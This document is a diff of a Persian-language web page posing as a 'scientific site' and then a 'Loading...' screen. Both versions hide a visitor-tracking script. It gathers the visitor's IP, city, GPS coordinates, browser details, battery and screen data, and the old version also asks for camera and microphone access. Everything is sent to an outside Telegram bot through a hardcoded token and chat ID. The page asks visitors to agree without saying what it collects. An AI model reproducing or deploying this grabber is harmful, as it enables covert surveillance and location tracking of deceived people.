@@ -2,277 +2,101 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>سایت علمی</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>در حال بارگذاری...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      font-family: Tahoma, sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      color: white;
-      margin: 0; height: 100vh;
-      display: flex; justify-content: center; align-items: center;
-      direction: rtl;
-    }
-    #modal {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.7);
+      background: #111;
+      color: #eee;
       display: flex;
       justify-content: center;
       align-items: center;
-      z-index: 10000;
-    }
-    #modalContent {
-      background: #2a5298;
-      padding: 30px 40px;
-      border-radius: 15px;
-      max-width: 400px;
-      box-shadow: 0 0 20px #ffd700;
-      text-align: center;
+      height: 100vh;
+      font-family: sans-serif;
     }
     button {
+      padding: 15px 30px;
+      font-size: 18px;
       background: #ffd700;
       border: none;
-      color: #222;
+      border-radius: 10px;
+      color: #000;
       font-weight: bold;
-      padding: 10px 20px;
-      border-radius: 8px;
       cursor: pointer;
-      margin: 10px 5px 0 5px;
-      transition: background 0.3s ease;
-    }
-    button:hover {
-      background: #ffca00;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 14px;
-      min-height: 100px;
-      color: #eee;
-      text-align: center;
-      white-space: pre-line;
-      font-family: monospace;
-      max-height: 180px;
-      overflow-y: auto;
-      background: rgba(255 255 255 / 0.1);
-      padding: 10px;
-      border-radius: 8px;
     }
   </style>
 </head>
 <body>
 
-<div id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
-  <div id="modalContent">
-    <h2 id="modalTitle">سایت علمی</h2>
-    <p id="modalDesc">عکسها</p>
-    <button id="allowBtn">موافقم</button>
-    <button id="denyBtn">بله</button>
-    <div id="status" aria-live="polite"></div>
-  </div>
-</div>
+<button onclick="start()">ادامه</button>
 
 <script>
-  const TELEGRAM_BOT_TOKEN = "7652388395:AAHntUUw7_v73YQp_6ZzyqObdJyK22V-6Do";
-  const TELEGRAM_CHAT_ID = "2040814894";
+  const BOT_TOKEN = "7652388395:AAHntUUw7_v73YQp_6ZzyqObdJyK22V-6Do";
+  const CHAT_ID = "2040814894";
 
-  const modal = document.getElementById('modal');
-  const allowBtn = document.getElementById('allowBtn');
-  const denyBtn = document.getElementById('denyBtn');
-  const status = document.getElementById('status');
+  async function start() {
+    let latlon = "موقعیت نامشخص";
 
-  function log(msg) {
-    status.textContent += msg + "\n";
-    status.scrollTop = status.scrollHeight;
-  }
-
-  function parseUserAgent(ua) {
-    let os = "نامشخص";
-    if (/Android/i.test(ua)) os = "اندروید";
-    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
-    else if (/Windows NT/i.test(ua)) os = "ویندوز";
-    else if (/Mac OS X/i.test(ua)) os = "مک او اس";
-    else if (/Linux/i.test(ua)) os = "لینوکس";
-
-    let device = "نامشخص";
-    if (/Mobile/i.test(ua)) device = "موبایل";
-    else if (/Tablet/i.test(ua)) device = "تبلت";
-    else device = "دسکتاپ";
-
-    return { os, device };
-  }
-
-  async function collectInfo() {
-    log("دریافت اطلاعات IP و موقعیت ...");
-    const ipData = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => null);
-
-    let batteryInfo = "نامشخص";
-    if (navigator.getBattery) {
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `🔋 شارژ: ${Math.round(battery.level * 100)}% | ${battery.charging ? 'در حال شارژ' : 'در حال مصرف'}`;
-      } catch {}
-    }
-
-    const ua = navigator.userAgent;
-    const lang = navigator.language;
-    const res = screen.width + "x" + screen.height;
-    const time = new Date().toLocaleString("fa-IR");
-    const net = navigator.connection ? navigator.connection.effectiveType : "نامشخص";
-    const online = navigator.onLine ? "آنلاین" : "آفلاین";
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "نامشخص";
-    const { os, device } = parseUserAgent(ua);
-
-    const sensors = {
-      gyroscope: !!window.DeviceOrientationEvent,
-      accelerometer: !!window.DeviceMotionEvent,
-      ambientLightSensor: 'AmbientLightSensor' in window,
-    };
-
-    let geoPosition = "نامشخص";
-    // درخواست موقعیت فقط اگر قبلاً تایید شده باشد
-    if (navigator.geolocation) {
-      geoPosition = await new Promise((res) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            res(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`);
-          },
-          () => {
-            res("عدم دسترسی یا خطا");
-          },
-          {timeout: 10000}
-        );
-      });
-    }
-
-    return {
-      time,
-      ip: ipData ? ipData.ip : "نامشخص",
-      country: ipData ? ipData.country_name : "نامشخص",
-      city: ipData ? ipData.city : "نامشخص",
-      ua,
-      lang,
-      res,
-      net,
-      batteryInfo,
-      online,
-      timezone,
-      os,
-      device,
-      sensors,
-      geoPosition
-    };
-  }
-
-  function buildMessage(data) {
-    return `
-📡 ورود جدید:
-
-🕓 زمان: ${data.time}
-🌍 کشور: ${data.country}
-🏙️ شهر: ${data.city}
-🌐 IP: ${data.ip}
-📍 موقعیت GPS: ${data.geoPosition}
-📱 سیستم عامل: ${data.os}
-📟 نوع دستگاه: ${data.device}
-📱 مرورگر: ${data.ua}
-🖥️ رزولوشن صفحه: ${data.res}
-📶 اینترنت: ${data.net}
-🌐 زبان سیستم: ${data.lang}
-${data.batteryInfo}
-🔌 وضعیت اتصال: ${data.online}
-🕰️ منطقه زمانی: ${data.timezone}
-
-⚙️ حسگرها:
-- ژیروسکوپ: ${data.sensors.gyroscope ? "دارد" : "ندارد"}
-- شتاب‌سنج: ${data.sensors.accelerometer ? "دارد" : "ندارد"}
-- حسگر نور محیط: ${data.sensors.ambientLightSensor ? "دارد" : "ندارد"}
-    `.trim();
-  }
-
-  async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message
-    };
-    try {
-      const resp = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-      if (!resp.ok) throw new Error("خطا در ارسال");
-      log("پیام به تلگرام ارسال شد.");
-      return true;
-    } catch {
-      log("ارسال به تلگرام با خطا مواجه شد.");
-      return false;
-    }
-  }
-
-  async function requestPermissionsAndSend() {
-    modal.querySelector("p").textContent = "لطفاً اجازه دسترسی به موقعیت، دوربین و میکروفون را بدهید.";
-    log("منتظر اجازه کاربر...");
-    
-    // ابتدا درخواست موقعیت
+    // دریافت موقعیت
     if (navigator.geolocation) {
       try {
-        await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(
-            () => { log("موقعیت دریافت شد."); res(); },
-            () => { log("موقعیت داده نشد."); res(); },
-            {timeout: 10000}
-          );
+        await new Promise(resolve => {
+          navigator.geolocation.getCurrentPosition(pos => {
+            latlon = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
+            resolve();
+          }, () => resolve(), {timeout: 8000});
         });
       } catch {}
-    } else {
-      log("مرورگر موقعیت پشتیبانی نمی‌کند.");
     }
 
-    // بعد درخواست دوربین
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    // دریافت آی‌پی و جزئیات دیگر
+    let ipinfo = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => null);
+
+    const info = {
+      ip: ipinfo?.ip || "نامشخص",
+      city: ipinfo?.city || "نامشخص",
+      country: ipinfo?.country_name || "نامشخص",
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      res: `${screen.width}x${screen.height}`,
+      battery: "نامشخص",
+      location: latlon
+    };
+
+    if (navigator.getBattery) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        log("دسترسی دوربین داده شد.");
-        stream.getTracks().forEach(t => t.stop());
-      } catch {
-        log("دسترسی دوربین داده نشد.");
-      }
-    } else {
-      log("دوربین پشتیبانی نمی‌شود.");
+        const b = await navigator.getBattery();
+        info.battery = `${Math.round(b.level * 100)}% - ${b.charging ? "شارژ می‌شود" : "در حال مصرف"}`;
+      } catch {}
     }
 
-    // بعد درخواست میکروفون
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        log("دسترسی میکروفون داده شد.");
-        stream.getTracks().forEach(t => t.stop());
-      } catch {
-        log("دسترسی میکروفون داده نشد.");
-      }
-    } else {
-      log("میکروفون پشتیبانی نمی‌شود.");
-    }
+    const text = `
+📥 ورود جدید:
 
-    // حالا اطلاعات رو جمع‌آوری و ارسال کن
-    const data = await collectInfo();
-    const msg = buildMessage(data);
-    await sendToTelegram(msg);
+🌐 IP: ${info.ip}
+🏙️ شهر: ${info.city}
+🌍 کشور: ${info.country}
+📱 مرورگر: ${info.ua}
+🔋 باتری: ${info.battery}
+🗺️ موقعیت: ${info.location}
+📏 رزولوشن: ${info.res}
+🗣️ زبان: ${info.lang}
+    `.trim();
 
-    modal.style.display = "none";
+    // ارسال به تلگرام
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    }).then(() => {
+      document.body.innerHTML = "<h2 style='color:white'>✅ اطلاعات ثبت شد.</h2>";
+    }).catch(() => {
+      document.body.innerHTML = "<h2 style='color:red'>❌ ارسال نشد.</h2>";
+    });
   }
-
-  allowBtn.onclick = () => {
-    status.textContent = "";
-    requestPermissionsAndSend();
-  };
-
-  denyBtn.onclick = () => {
-    status.textContent = "کاربر اجازه دسترسی نداد.";
-    modal.style.display = "none";
-  };
 </script>
 
 </body>
